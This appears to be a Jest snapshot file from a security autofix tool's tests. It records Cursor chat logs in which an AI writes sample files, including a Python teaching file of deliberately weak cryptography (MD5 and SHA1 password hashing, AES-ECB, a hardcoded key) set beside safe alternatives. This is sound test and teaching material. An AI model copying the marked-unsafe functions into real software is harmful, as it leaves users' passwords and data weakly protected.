1. **\`sample_ssrf_vulnerable.py\`** — Server-Side Request Forgery (SSRF) vulnerabilities in Python, including:
   - Unsafe direct URL requests without validation
   - Unsafe URL whitelist that can be bypassed
   - Unsafe DNS resolution vulnerable to DNS rebinding
   - Safe URL validation with scheme, domain, and IP checks
   - Safe internal IP detection
   - Safe use of proxies and restricted API endpoints

2. **\`sample_race_condition.go\`** — Race condition vulnerabilities in Go, including:
   - Unsafe time-of-check to time-of-use (TOCTOU) conditions
   - Unsafe non-atomic file operations
   - Unsafe concurrent access without synchronization
   - Safe use of O_EXCL for atomic file creation
   - Safe use of file locks for atomic operations
   - Safe use of mutexes and atomic operations
   - Safe use of channels for concurrent communication
   - Safe file path validation

These cover SSRF and race conditions with examples of unsafe patterns and secure alternatives.",
        "tokens": {
          "inputCount": 52310,
          "outputCount": 3481,
        },
        "tool": undefined,
        "type": "AI_RESPONSE",
      },
      {
        "attachedFiles": [],
        "date": 2025-11-03T17:13:09.509Z,
        "text": "creatre a ramndom file in the root of the repo",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": undefined,
        "type": "USER_PROMPT",
      },
      {
        "attachedFiles": [],
        "date": 2025-11-03T17:13:15.770Z,
        "text": "Creating a random file in the repo root:
",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": undefined,
        "type": "AI_RESPONSE",
      },
      {
        "attachedFiles": [],
        "date": 2025-11-03T17:13:15.868Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": true,
          "name": "write",
          "parameters": "{"relativeWorkspacePath":"/Users/jonathanafek/src/autofixer/random_file.txt"}",
          "rawArguments": "{"file_path": "/Users/jonathanafek/src/autofixer/random_file.txt", "contents": "This is a random file created in the repository root.\\n\\nRandom content:\\n- Random number: 847392\\n- Random word: serendipity\\n- Random fact: The word \\"random\\" comes from the Middle French word \\"randon\\" meaning \\"impetuosity\\"\\n- Random quote: \\"The only way to do great work is to love what you do.\\" - Steve Jobs\\n- Random list:\\n  1. Apples\\n  2. Oranges\\n  3. Bananas\\n  4. Grapes\\n  5. Strawberries\\n\\nGenerated: 2024\\nPurpose: Sample random file for testing\\n\\nEnd of random file."}",
          "result": "{"diff":{"chunks":[{"diffString":"- \\n+ This is a random file created in the repository root.\\n+ \\n+ Random content:\\n+ - Random number: 847392\\n+ - Random word: serendipity\\n+ - Random fact: The word \\"random\\" comes from the Middle French word \\"randon\\" meaning \\"impetuosity\\"\\n+ - Random quote: \\"The only way to do great work is to love what you do.\\" - Steve Jobs\\n+ - Random list:\\n+   1. Apples\\n+   2. Oranges\\n+   3. Bananas\\n+   4. Grapes\\n+   5. Strawberries\\n+ \\n+ Generated: 2024\\n+ Purpose: Sample random file for testing\\n+ \\n+ End of random file.","oldStart":1,"newStart":1,"oldLines":1,"newLines":18,"linesRemoved":1,"linesAdded":18}],"editor":"EDITOR_AI"},"shouldAutoFixLints":true,"resultForModel":"Wrote contents to /Users/jonathanafek/src/autofixer/random_file.txt.","contentsAfterEdit":"This is a random file created in the repository root.\\n\\nRandom content:\\n- Random number: 847392\\n- Random word: serendipity\\n- Random fact: The word \\"random\\" comes from the Middle French word \\"randon\\" meaning \\"impetuosity\\"\\n- Random quote: \\"The only way to do great work is to love what you do.\\" - Steve Jobs\\n- Random list:\\n  1. Apples\\n  2. Oranges\\n  3. Bananas\\n  4. Grapes\\n  5. Strawberries\\n\\nGenerated: 2024\\nPurpose: Sample random file for testing\\n\\nEnd of random file.\\n"}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-11-03T17:13:25.226Z,
        "text": "Created \`random_file.txt\` in the repo root with random content.",
        "tokens": {
          "inputCount": 52943,
          "outputCount": 283,
        },
        "tool": undefined,
        "type": "AI_RESPONSE",
      },
      {
        "attachedFiles": [
          {
            "relativePath": "random_file.txt",
            "startLine": 1,
          },
        ],
        "date": 2025-11-03T21:42:49.294Z,
        "text": "and now create another one",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": undefined,
        "type": "USER_PROMPT",
      },
      {
        "attachedFiles": [],
        "date": 2025-11-03T21:43:08.907Z,
        "text": "Creating another random file in the repo root:
",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": undefined,
        "type": "AI_RESPONSE",
      },
      {
        "attachedFiles": [],
        "date": 2025-11-03T21:43:08.956Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": true,
          "name": "write",
          "parameters": "{"relativeWorkspacePath":"/Users/jonathanafek/src/autofixer/another_random_file.md"}",
          "rawArguments": "{"file_path": "/Users/jonathanafek/src/autofixer/another_random_file.md", "contents": "# Another Random File\\n\\nThis is a markdown file with random content.\\n\\n## Random Information\\n\\n- **Random ID**: \`a7f3b2c9-d4e1-4f8a-9b6c-2e5d7a8f3c1b\`\\n- **Random Color**: \`#8B3A9F\`\\n- **Random Date**: March 15, 2024\\n- **Random Coordinates**: 40.7128° N, 74.0060° W\\n\\n## Random Code Snippet\\n\\n\`\`\`python\\ndef random_function():\\n    import random\\n    numbers = [random.randint(1, 100) for _ in range(10)]\\n    return sum(numbers) / len(numbers)\\n\`\`\`\\n\\n## Random List\\n\\n- Item Alpha\\n- Item Beta\\n- Item Gamma\\n- Item Delta\\n- Item Epsilon\\n\\n## Random Quote\\n\\n> \\"In the middle of difficulty lies opportunity.\\" - Albert Einstein\\n\\n## Random Notes\\n\\nLorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.\\n\\n---\\n\\nEnd of random markdown file."}",
          "result": "{"diff":{"chunks":[{"diffString":"- \\n+ # Another Random File\\n+ \\n+ This is a markdown file with random content.\\n+ \\n+ ## Random Information\\n+ \\n+ - **Random ID**: \`a7f3b2c9-d4e1-4f8a-9b6c-2e5d7a8f3c1b\`\\n+ - **Random Color**: \`#8B3A9F\`\\n+ - **Random Date**: March 15, 2024\\n+ - **Random Coordinates**: 40.7128° N, 74.0060° W\\n+ \\n+ ## Random Code Snippet\\n+ \\n+ \`\`\`python\\n+ def random_function():\\n+     import random\\n+     numbers = [random.randint(1, 100) for _ in range(10)]\\n+     return sum(numbers) / len(numbers)\\n+ \`\`\`\\n+ \\n+ ## Random List\\n+ \\n+ - Item Alpha\\n+ - Item Beta\\n+ - Item Gamma\\n+ - Item Delta\\n+ - Item Epsilon\\n+ \\n+ ## Random Quote\\n+ \\n+ > \\"In the middle of difficulty lies opportunity.\\" - Albert Einstein\\n+ \\n+ ## Random Notes\\n+ \\n+ Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.\\n+ \\n+ ---\\n+ \\n+ End of random markdown file.","oldStart":1,"newStart":1,"oldLines":1,"newLines":39,"linesRemoved":1,"linesAdded":39}],"editor":"EDITOR_AI"},"shouldAutoFixLints":true,"resultForModel":"Wrote contents to /Users/jonathanafek/src/autofixer/another_random_file.md.","contentsAfterEdit":"# Another Random File\\n\\nThis is a markdown file with random content.\\n\\n## Random Information\\n\\n- **Random ID**: \`a7f3b2c9-d4e1-4f8a-9b6c-2e5d7a8f3c1b\`\\n- **Random Color**: \`#8B3A9F\`\\n- **Random Date**: March 15, 2024\\n- **Random Coordinates**: 40.7128° N, 74.0060° W\\n\\n## Random Code Snippet\\n\\n\`\`\`python\\ndef random_function():\\n    import random\\n    numbers = [random.randint(1, 100) for _ in range(10)]\\n    return sum(numbers) / len(numbers)\\n\`\`\`\\n\\n## Random List\\n\\n- Item Alpha\\n- Item Beta\\n- Item Gamma\\n- Item Delta\\n- Item Epsilon\\n\\n## Random Quote\\n\\n> \\"In the middle of difficulty lies opportunity.\\" - Albert Einstein\\n\\n## Random Notes\\n\\nLorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.\\n\\n---\\n\\nEnd of random markdown file.\\n"}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-11-03T21:43:15.594Z,
        "text": "Created another random file: \`another_random_file.md\` in the repo root. It includes random information, a code snippet, lists, and notes in Markdown.",
        "tokens": {
          "inputCount": 53605,
          "outputCount": 377,
        },
        "tool": undefined,
        "type": "AI_RESPONSE",
      },
      {
        "attachedFiles": [
          {
            "relativePath": "another_random_file.md",
            "startLine": 1,
          },
        ],
        "date": 2025-11-03T21:43:55.901Z,
        "text": "and now one more",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": undefined,
        "type": "USER_PROMPT",
      },
      {
        "attachedFiles": [],
        "date": 2025-11-03T21:44:03.847Z,
        "text": "Creating one more random file in the repo root:
",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": undefined,
        "type": "AI_RESPONSE",
      },
      {
        "attachedFiles": [],
        "date": 2025-11-03T21:44:03.892Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": true,
          "name": "write",
          "parameters": "{"relativeWorkspacePath":"/Users/jonathanafek/src/autofixer/yet_another_random.json"}",
          "rawArguments": "{"file_path": "/Users/jonathanafek/src/autofixer/yet_another_random.json", "contents": "{\\n  \\"type\\": \\"random_file\\",\\n  \\"version\\": \\"1.0.0\\",\\n  \\"metadata\\": {\\n    \\"created\\": \\"2024-03-15T10:30:00Z\\",\\n    \\"author\\": \\"random_generator\\",\\n    \\"purpose\\": \\"sample_data\\"\\n  },\\n  \\"random_data\\": {\\n    \\"numbers\\": [42, 73, 91, 15, 67, 28, 54, 89],\\n    \\"strings\\": [\\"hello\\", \\"world\\", \\"random\\", \\"file\\", \\"content\\"],\\n    \\"boolean\\": true,\\n    \\"null_value\\": null,\\n    \\"nested_object\\": {\\n      \\"key1\\": \\"value1\\",\\n      \\"key2\\": \\"value2\\",\\n      \\"key3\\": {\\n        \\"deep_key\\": \\"deep_value\\"\\n      }\\n    }\\n  },\\n  \\"random_array\\": [\\n    {\\n      \\"id\\": 1,\\n      \\"name\\": \\"Item One\\",\\n      \\"active\\": true\\n    },\\n    {\\n      \\"id\\": 2,\\n      \\"name\\": \\"Item Two\\",\\n      \\"active\\": false\\n    },\\n    {\\n      \\"id\\": 3,\\n      \\"name\\": \\"Item Three\\",\\n      \\"active\\": true\\n    }\\n  ],\\n  \\"notes\\": \\"This is a random JSON file with various data structures for testing purposes.\\"\\n}"}",
          "result": "{"diff":{"chunks":[{"diffString":"- \\n+ {\\n+   \\"type\\": \\"random_file\\",\\n+   \\"version\\": \\"1.0.0\\",\\n+   \\"metadata\\": {\\n+     \\"created\\": \\"2024-03-15T10:30:00Z\\",\\n+     \\"author\\": \\"random_generator\\",\\n+     \\"purpose\\": \\"sample_data\\"\\n+   },\\n+   \\"random_data\\": {\\n+     \\"numbers\\": [42, 73, 91, 15, 67, 28, 54, 89],\\n+     \\"strings\\": [\\"hello\\", \\"world\\", \\"random\\", \\"file\\", \\"content\\"],\\n+     \\"boolean\\": true,\\n+     \\"null_value\\": null,\\n+     \\"nested_object\\": {\\n+       \\"key1\\": \\"value1\\",\\n+       \\"key2\\": \\"value2\\",\\n+       \\"key3\\": {\\n+         \\"deep_key\\": \\"deep_value\\"\\n+       }\\n+     }\\n+   },\\n+   \\"random_array\\": [\\n+     {\\n+       \\"id\\": 1,\\n+       \\"name\\": \\"Item One\\",\\n+       \\"active\\": true\\n+     },\\n+     {\\n+       \\"id\\": 2,\\n+       \\"name\\": \\"Item Two\\",\\n+       \\"active\\": false\\n+     },\\n+     {\\n+       \\"id\\": 3,\\n+       \\"name\\": \\"Item Three\\",\\n+       \\"active\\": true\\n+     }\\n+   ],\\n+   \\"notes\\": \\"This is a random JSON file with various data structures for testing purposes.\\"\\n+ }","oldStart":1,"newStart":1,"oldLines":1,"newLines":40,"linesRemoved":1,"linesAdded":40}],"editor":"EDITOR_AI"},"shouldAutoFixLints":true,"resultForModel":"Wrote contents to /Users/jonathanafek/src/autofixer/yet_another_random.json.","contentsAfterEdit":"{\\n  \\"type\\": \\"random_file\\",\\n  \\"version\\": \\"1.0.0\\",\\n  \\"metadata\\": {\\n    \\"created\\": \\"2024-03-15T10:30:00Z\\",\\n    \\"author\\": \\"random_generator\\",\\n    \\"purpose\\": \\"sample_data\\"\\n  },\\n  \\"random_data\\": {\\n    \\"numbers\\": [42, 73, 91, 15, 67, 28, 54, 89],\\n    \\"strings\\": [\\"hello\\", \\"world\\", \\"random\\", \\"file\\", \\"content\\"],\\n    \\"boolean\\": true,\\n    \\"null_value\\": null,\\n    \\"nested_object\\": {\\n      \\"key1\\": \\"value1\\",\\n      \\"key2\\": \\"value2\\",\\n      \\"key3\\": {\\n        \\"deep_key\\": \\"deep_value\\"\\n      }\\n    }\\n  },\\n  \\"random_array\\": [\\n    {\\n      \\"id\\": 1,\\n      \\"name\\": \\"Item One\\",\\n      \\"active\\": true\\n    },\\n    {\\n      \\"id\\": 2,\\n      \\"name\\": \\"Item Two\\",\\n      \\"active\\": false\\n    },\\n    {\\n      \\"id\\": 3,\\n      \\"name\\": \\"Item Three\\",\\n      \\"active\\": true\\n    }\\n  ],\\n  \\"notes\\": \\"This is a random JSON file with various data structures for testing purposes.\\"\\n}\\n"}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-11-03T21:44:15.454Z,
        "text": "Created another random file: \`yet_another_random.json\` in the repo root. It's a JSON file with random data structures, including numbers, strings, booleans, nested objects, and arrays.",
        "tokens": {
          "inputCount": 54139,
          "outputCount": 477,
        },
        "tool": undefined,
        "type": "AI_RESPONSE",
      },
      {
        "attachedFiles": [
          {
            "relativePath": "yet_another_random.json",
            "startLine": 1,
          },
        ],
        "date": 2025-11-03T22:14:38.248Z,
        "text": "and one more file",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": undefined,
        "type": "USER_PROMPT",
      },
      {
        "attachedFiles": [],
        "date": 2025-11-03T22:14:43.123Z,
        "text": "Creating one more random file:
",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": undefined,
        "type": "AI_RESPONSE",
      },
      {
        "attachedFiles": [],
        "date": 2025-11-03T22:14:43.198Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": true,
          "name": "write",
          "parameters": "{"relativeWorkspacePath":"/Users/jonathanafek/src/autofixer/final_random_file.py"}",
          "rawArguments": "{"file_path": "/Users/jonathanafek/src/autofixer/final_random_file.py", "contents": "#!/usr/bin/env python3\\n\\"\\"\\"\\nFinal random file - Python script with random utilities\\n\\"\\"\\"\\n\\nimport random\\nimport string\\nfrom datetime import datetime\\nfrom typing import List, Dict\\n\\n\\ndef generate_random_string(length: int = 10) -> str:\\n    \\"\\"\\"Generate a random alphanumeric string.\\"\\"\\"\\n    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))\\n\\n\\ndef generate_random_numbers(count: int = 5) -> List[int]:\\n    \\"\\"\\"Generate a list of random numbers.\\"\\"\\"\\n    return [random.randint(1, 100) for _ in range(count)]\\n\\n\\ndef generate_random_data() -> Dict:\\n    \\"\\"\\"Generate a dictionary with random data.\\"\\"\\"\\n    return {\\n        'timestamp': datetime.now().isoformat(),\\n        'random_id': generate_random_string(8),\\n        'numbers': generate_random_numbers(7),\\n        'boolean': random.choice([True, False]),\\n        'float': round(random.uniform(0.0, 100.0), 2),\\n    }\\n\\n\\ndef main():\\n    \\"\\"\\"Main function to demonstrate random utilities.\\"\\"\\"\\n    print(\\"Random File Generator\\")\\n    print(\\"=\\" * 40)\\n    \\n    data = generate_random_data()\\n    print(f\\"Generated Data: {data}\\")\\n    \\n    print(f\\"\\\\nRandom String: {generate_random_string(12)}\\")\\n    print(f\\"Random Numbers: {generate_random_numbers(10)}\\")\\n    print(f\\"Random Choice: {random.choice(['apple', 'banana', 'cherry', 'date'])}\\")\\n\\n\\nif __name__ == \\"__main__\\":\\n    main()"}",
          "result": "{"diff":{"chunks":[{"diffString":"- \\n+ #!/usr/bin/env python3\\n+ \\"\\"\\"\\n+ Final random file - Python script with random utilities\\n+ \\"\\"\\"\\n+ \\n+ import random\\n+ import string\\n+ from datetime import datetime\\n+ from typing import List, Dict\\n+ \\n+ \\n+ def generate_random_string(length: int = 10) -> str:\\n+     \\"\\"\\"Generate a random alphanumeric string.\\"\\"\\"\\n+     return ''.join(random.choices(string.ascii_letters + string.digits, k=length))\\n+ \\n+ \\n+ def generate_random_numbers(count: int = 5) -> List[int]:\\n+     \\"\\"\\"Generate a list of random numbers.\\"\\"\\"\\n+     return [random.randint(1, 100) for _ in range(count)]\\n+ \\n+ \\n+ def generate_random_data() -> Dict:\\n+     \\"\\"\\"Generate a dictionary with random data.\\"\\"\\"\\n+     return {\\n+         'timestamp': datetime.now().isoformat(),\\n+         'random_id': generate_random_string(8),\\n+         'numbers': generate_random_numbers(7),\\n+         'boolean': random.choice([True, False]),\\n+         'float': round(random.uniform(0.0, 100.0), 2),\\n+     }\\n+ \\n+ \\n+ def main():\\n+     \\"\\"\\"Main function to demonstrate random utilities.\\"\\"\\"\\n+     print(\\"Random File Generator\\")\\n+     print(\\"=\\" * 40)\\n+     \\n+     data = generate_random_data()\\n+     print(f\\"Generated Data: {data}\\")\\n+     \\n+     print(f\\"\\\\nRandom String: {generate_random_string(12)}\\")\\n+     print(f\\"Random Numbers: {generate_random_numbers(10)}\\")\\n+     print(f\\"Random Choice: {random.choice(['apple', 'banana', 'cherry', 'date'])}\\")\\n+ \\n+ \\n+ if __name__ == \\"__main__\\":\\n+     main()","oldStart":1,"newStart":1,"oldLines":1,"newLines":47,"linesRemoved":1,"linesAdded":47}],"editor":"EDITOR_AI"},"shouldAutoFixLints":true,"resultForModel":"Wrote contents to /Users/jonathanafek/src/autofixer/final_random_file.py.","contentsAfterEdit":"#!/usr/bin/env python3\\n\\"\\"\\"\\nFinal random file - Python script with random utilities\\n\\"\\"\\"\\n\\nimport random\\nimport string\\nfrom datetime import datetime\\nfrom typing import List, Dict\\n\\n\\ndef generate_random_string(length: int = 10) -> str:\\n    \\"\\"\\"Generate a random alphanumeric string.\\"\\"\\"\\n    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))\\n\\n\\ndef generate_random_numbers(count: int = 5) -> List[int]:\\n    \\"\\"\\"Generate a list of random numbers.\\"\\"\\"\\n    return [random.randint(1, 100) for _ in range(count)]\\n\\n\\ndef generate_random_data() -> Dict:\\n    \\"\\"\\"Generate a dictionary with random data.\\"\\"\\"\\n    return {\\n        'timestamp': datetime.now().isoformat(),\\n        'random_id': generate_random_string(8),\\n        'numbers': generate_random_numbers(7),\\n        'boolean': random.choice([True, False]),\\n        'float': round(random.uniform(0.0, 100.0), 2),\\n    }\\n\\n\\ndef main():\\n    \\"\\"\\"Main function to demonstrate random utilities.\\"\\"\\"\\n    print(\\"Random File Generator\\")\\n    print(\\"=\\" * 40)\\n    \\n    data = generate_random_data()\\n    print(f\\"Generated Data: {data}\\")\\n    \\n    print(f\\"\\\\nRandom String: {generate_random_string(12)}\\")\\n    print(f\\"Random Numbers: {generate_random_numbers(10)}\\")\\n    print(f\\"Random Choice: {random.choice(['apple', 'banana', 'cherry', 'date'])}\\")\\n\\n\\nif __name__ == \\"__main__\\":\\n    main()\\n"}",
        },
        "type": "TOOL_EXECUTION",
      },
    ],
    "responseTime": "2025-11-03T22:14:43.198Z",
    "tool": "Cursor",
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-uploadAiBlame-call-2 1`] = `
[
  {
    "blameType": "CHAT",
    "inference": """"
Sample Python code demonstrating weak cryptography vulnerabilities and fixes
"""

import hashlib
import secrets
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import base64

# VULNERABLE: Using MD5 for password hashing
def hash_password_unsafe_md5(password: str) -> str:
    # UNSAFE: MD5 is cryptographically broken and fast to brute-force
    return hashlib.md5(password.encode()).hexdigest()


# VULNERABLE: Using SHA1 for password hashing
def hash_password_unsafe_sha1(password: str) -> str:
    # UNSAFE: SHA1 is broken and vulnerable to collision attacks
    return hashlib.sha1(password.encode()).hexdigest()


# VULNERABLE: Using SHA256 without salt or iteration
def hash_password_unsafe_sha256(password: str) -> str:
    # UNSAFE: SHA256 is a fast hash, vulnerable to rainbow table attacks
    # UNSAFE: No salt means same passwords produce same hashes
    return hashlib.sha256(password.encode()).hexdigest()


# VULNERABLE: Weak encryption with ECB mode
def encrypt_unsafe_ecb(data: bytes, key: bytes) -> bytes:
    # UNSAFE: ECB mode reveals patterns (same plaintext = same ciphertext)
    # UNSAFE: No IV (Initialization Vector) means deterministic encryption
    cipher = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend())
    encryptor = cipher.encryptor()
    return encryptor.update(data) + encryptor.finalize()


# VULNERABLE: Hardcoded encryption key
def encrypt_unsafe_hardcoded_key(data: bytes) -> bytes:
    # UNSAFE: Hardcoded key in source code
    key = b"1234567890123456"  # Exposed in source!
    cipher = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend())
    encryptor = cipher.encryptor()
    return encryptor.update(data) + encryptor.finalize()


# SAFE: Using bcrypt for password hashing
def hash_password_safe_bcrypt(password: str) -> str:
    # SAFE: bcrypt is designed for password hashing (slow, salted)
    import bcrypt
    salt = bcrypt.gensalt()
    hashed = bcrypt.hashpw(password.encode(), salt)
    return hashed.decode()


# SAFE: Using Argon2 for password hashing (modern standard)
def hash_password_safe_argon2(password: str) -> str:
    # SAFE: Argon2 is the winner of Password Hashing Competition
    from argon2 import PasswordHasher
    ph = PasswordHasher()
    return ph.hash(password)


# SAFE: Using PBKDF2 with proper configuration
def hash_password_safe_pbkdf2(password: str, salt: bytes = None) -> tuple[str, bytes]:
    # SAFE: PBKDF2 with high iteration count and random salt
    if salt is None:
        salt = secrets.token_bytes(16)
    
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,  # High iteration count slows brute-force
        backend=default_backend()
    )
    key = base64.b64encode(kdf.derive(password.encode())).decode()
    return key, salt


# SAFE: Using AES-GCM for encryption
def encrypt_safe_gcm(data: bytes, key: bytes = None) -> tuple[bytes, bytes, bytes]:
    # SAFE: AES-GCM provides authenticated encryption
    if key is None:
        key = secrets.token_bytes(32)  # 256-bit key
    
    iv = secrets.token_bytes(12)  # 96-bit IV for GCM
    cipher = Cipher(algorithms.AES(key), modes.GCM(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(data) + encryptor.finalize()
    
    return ciphertext, encryptor.tag, iv


# SAFE: Verifying password hash
def verify_password_bcrypt(password: str, hashed: str) -> bool:
    # SAFE: bcrypt verification handles salt automatically
    import bcrypt
    return bcrypt.checkpw(password.encode(), hashed.encode())


# SAFE: Key derivation from password
def derive_key_from_password(password: str, salt: bytes = None) -> tuple[bytes, bytes]:
    # SAFE: Use proper key derivation function
    if salt is None:
        salt = secrets.token_bytes(16)
    
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )
    key = kdf.derive(password.encode())
    return key, salt",
    "model": "default",
    "prompts": [
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:47:45.917Z,
        "text": "please put sample files in the repo root",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": undefined,
        "type": "USER_PROMPT",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:47:51.204Z,
        "text": "Searching the codebase for existing sample files and checking what should be placed in the repo root.
",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": undefined,
        "type": "AI_RESPONSE",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:47:51.735Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": false,
          "name": "codebase_search",
          "parameters": "{"repositoryInfo":{"relativeWorkspacePath":".","repoName":"7297bde4-6c3c-4b5f-9f31-a615fa663f72","repoOwner":"google-oauth2|user_01JMHPT9B3D4A66MBMWNRKH8QX","orthogonalTransformSeed":3253139624173949,"preferredEmbeddingModel":"EMBEDDING_MODEL_UNSPECIFIED"},"query":"sample files examples","topK":15,"explanation":"","codeResults":[{"codeBlock":{"relativeWorkspacePath":"__tests__/constants/constants.ts","range":{"startPosition":{"line":61,"column":2},"endPosition":{"line":101,"column":19}},"signatures":{}},"score":0.32742080092430115},{"codeBlock":{"relativeWorkspacePath":"consumers/analyzer/tests/assets/java/pt/e-1488/source/README.md","range":{"startPosition":{"line":1,"column":1},"endPosition":{"line":81,"column":1}},"signatures":{}},"score":0.31596270203590393},{"codeBlock":{"relativeWorkspacePath":"patchino/patchino/generator/prompt_files/markdown_system_prompt.txt","range":{"startPosition":{"line":1,"column":1},"endPosition":{"line":45,"column":1}},"signatures":{}},"score":0.3146929144859314},{"codeBlock":{"relativeWorkspacePath":"services/node_general_backend/src/maintenance/try_now.ts","range":{"startPosition":{"line":1,"column":1},"endPosition":{"line":40,"column":5}},"signatures":{}},"score":0.3024810552597046},{"codeBlock":{"relativeWorkspacePath":"patchino/ai-playground/src/components/mock.ts","range":{"startPosition":{"line":1,"column":1},"endPosition":{"line":333,"column":1}},"signatures":{}},"score":0.29074323177337646},{"codeBlock":{"relativeWorkspacePath":"consumers/analyzer/README.md","range":{"startPosition":{"line":1,"column":1},"endPosition":{"line":45,"column":1}},"signatures":{}},"score":0.2902885973453522},{"codeBlock":{"relativeWorkspacePath":"consumers/analyzer/tests/assets/java/pt/e-1488/source/README.md","range":{"startPosition":{"line":81,"column":1},"endPosition":{"line":160,"column":1}},"signatures":{}},"score":0.288938045501709},{"codeBlock":{"relativeWorkspacePath":"clients/cli/__tests__/mcp/fileUtils.unit.test.ts","range":{"startPosition":{"line":210,"column":7},"endPosition":{"line":282,"column":28}},"signatures":{"ranges":[{"startPosition":{"line":19,"column":1},"endPosition":{"line":19,"column":1}},{"startPosition":{"line":19,"column":23},"endPosition":{"line":20,"column":3}},{"startPosition":{"line":31,"column":3},"endPosition":{"line":31,"column":3}},{"startPosition":{"line":31,"column":34},"endPosition":{"line":32,"column":5}}]}},"score":0.2807697057723999},{"codeBlock":{"relativeWorkspacePath":"services/app/src/components/Analysis/collapsible/GenerateAIRule.tsx","range":{"startPosition":{"line":1,"column":1},"endPosition":{"line":37,"column":78}},"signatures":{}},"score":0.28029704093933105},{"codeBlock":{"relativeWorkspacePath":"patchino/patchino/sampler.py","range":{"startPosition":{"line":240,"column":20},"endPosition":{"line":268,"column":18}},"signatures":{}},"score":0.2794812321662903},{"codeBlock":{"relativeWorkspacePath":"clients/cli/__tests__/mcp/helpers/MockRepo.ts","range":{"startPosition":{"line":1,"column":1},"endPosition":{"line":61,"column":4}},"signatures":{}},"score":0.27924689650535583},{"codeBlock":{"relativeWorkspacePath":"patchino/patchino/generator/templates/vulnerability_template.md.txt","range":{"startPosition":{"line":1,"column":1},"endPosition":{"line":63,"column":1}},"signatures":{}},"score":0.2715897858142853},{"codeBlock":{"relativeWorkspacePath":"consumers/analyzer/tests/assets/python/wildcard_imports/README.md","range":{"startPosition":{"line":1,"column":1},"endPosition":{"line":49,"column":1}},"signatures":{}},"score":0.2711057662963867},{"codeBlock":{"relativeWorkspacePath":"consumers/analyzer/tests/assets/java/sqli/e-1578/source/README.md","range":{"startPosition":{"line":1,"column":1},"endPosition":{"line":68,"column":1}},"signatures":{}},"score":0.2711007595062256},{"codeBlock":{"relativeWorkspacePath":"pycommon/tests/conftest.py","range":{"startPosition":{"line":1,"column":1},"endPosition":{"line":42,"column":22}},"signatures":{}},"score":0.2702752351760864}]}",
          "rawArguments": "{"query": "sample files examples", "target_directories": []}",
          "result": "{"codeResults":[{"codeBlock":{"relativeWorkspacePath":"__tests__/constants/constants.ts","range":{"startPosition":{"line":55},"endPosition":{"line":232,"column":1}},"contents":"\\n\\nexport const CONSTANTS = {\\n  DATA: {\\n    EMPTY: {\\n      UPLOAD_FILE: {\\n        SEMGREP: getUploadFile('files/empty/semgrep.json'),\\n      },\\n      GIT_REPO: 'https://github.com/mobbcitestjob/webgoat',\\n      REFERENCE: 'c7a41d1b178d006053293699061e0dfdb4f47b99',\\n      REPO_ARCHIVE: getUploadFile('files/empty/repo.zip'),\\n    } as TestData,\\n    WEBGOAT_MINIMAL: {\\n      UPLOAD_FILE: {\\n        //filtered report leaving only 6 sqli findings with fixes that have conflicts\\n        CHECKMARX: getUploadFile('files/webgoat/checkmarx-minimal.json'),\\n      },\\n      GIT_REPO: 'https://github.com/mobbcitestjob/webgoat',\\n      REFERENCE: 'c7a41d1b178d006053293699061e0dfdb4f47b99',\\n    } as TestData,\\n    WEBGOAT: {\\n      UPLOAD_FILE: {\\n        CODEQL: getUploadFile('files/webgoat/codeql.json'),\\n        CHECKMARX: getUploadFile('files/webgoat/checkmarx.json'),\\n        CHECKMARX_XML: getUploadFile('files/webgoat/checkmarx.xml'),\\n        SNYK: getUploadFile('files/webgoat/snyk.json'),\\n        FORTIFY: getUploadFile('files/webgoat/scandata.fpr'),\\n        SONARQUBE: getUploadFile('files/webgoat/sonarqube.json'),\\n      },\\n      GIT_REPO: 'https://github.com/WebGoat/WebGoat',\\n      REFERENCE: 'c7a41d1b178d006053293699061e0dfdb4f47b99',\\n      REPO_ARCHIVE: getUploadFile('files/webgoat/repo.zip'),\\n    } as TestData,\\n    